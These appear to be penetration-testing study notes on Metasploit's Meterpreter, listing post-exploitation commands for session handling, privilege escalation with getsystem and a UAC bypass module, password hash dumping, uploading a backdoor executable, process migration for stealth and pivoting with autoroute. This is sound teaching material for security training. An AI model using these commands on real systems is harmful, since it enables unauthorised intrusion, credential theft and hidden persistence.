#### Meterpreter

- Meterpreter can both wait for a connection on the target
machine or connect back to the attacker machine. Its most
used configurations are `bind_tcp` and `reverse_tcp`.
- A single instance of MSFConsole can host multiple
Meterpreter sessions; this means that you can instance
multiple shells on your targets and switch between them.
You can switch from a Meterpreter session to the console
by using the `background` command.
- You can then list currently opened sessions by using the
`sessions -l` command.
- To resume a background session, you have to use the
`sessions -i <session number>` command.
* * *

#### Meterpreter shell
- The `sysinfo` command lets you retrieve information about the
exploited machine: name, operating system, architecture, system language and the Meterpreter version it is running.
- The `ifconfig` command prints the network configuration.
- You can check routing information with the `route` command.
- To know which user is running the process exploited by
Metasploit, you can use the `getuid` command.
- If the owner of the process does not have high privileges on the victim system, you can use the `getsystem` command.
- In modern Windows operating systems, the User Account Control policy prevents privilege escalation.We can bypass UAC by using bypassuac module.
Example: `use exploit/windows/local/bypassuac` and set options and execute by typing `exploit`.
- Dumping the password database:
` use post/windows/gather/hashdump`
Then type `exploit` to exploit the victim.
- Exploring victim computer: `pwd`, `cd C:\\`, `ls`.
- Downloading and uploading: `download HaxLogs.log /root/`, `upload /root/backdoor.exe C:\\Windows`

-  Type `shell` to run standard operating system shell.
- `migrate <process id>` to silently attach to another process to make ourself stealthier. We can see process by typing `ps`.
- `hashdump` for dumping password.
- `search -f congrats.txt` for searching congrats.txt file.
- `run autoroute -s 172.16.50.0/24` to create route through exploited machine.
* * *